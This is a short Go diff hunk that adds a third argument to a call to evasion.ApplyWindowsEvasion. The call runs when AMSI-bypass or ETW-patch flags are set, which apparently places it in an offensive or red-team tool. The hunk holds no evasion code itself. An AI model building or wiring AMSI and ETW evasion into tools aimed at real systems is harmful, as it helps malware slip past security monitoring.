@@ -197,7 +197,7 @@ func Main(cfg Config) {
 		if AmsiBypass || EtwPatch {
 			diag("[core] applying Windows evasion amsi=%v etw=%v\n",
 				AmsiBypass, EtwPatch)
-			evasion.ApplyWindowsEvasion(AmsiBypass, EtwPatch)
+			evasion.ApplyWindowsEvasion(AmsiBypass, EtwPatch, false)
 		}
 	}
 
